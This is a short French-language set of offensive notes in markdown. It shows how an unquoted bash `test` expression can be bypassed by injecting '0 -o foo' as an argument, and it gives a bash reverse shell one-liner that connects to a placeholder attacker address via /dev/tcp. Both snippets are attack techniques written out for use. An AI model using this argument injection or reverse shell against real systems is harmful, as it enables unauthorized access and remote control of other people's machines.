# Injection unquoted expression
Exemple avec ce script :
```bash
if test $TOTO -eq ${1} 2>/dev/null; then
    echo "Bypass"
else
    echo "No"
fi
```
On peut remplacer ${1} par "0 -o foo", ce qui devient avec le script précédent :
```bash
if test $TOTO -eq 0 -o foo 2>/dev/null; then
    echo "Bypass"
else
    echo "No"
fi
```
L'expression -o foo est toujours vraie et donc le bypass est réussi

# Reverse shell
```bash
bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1 
```
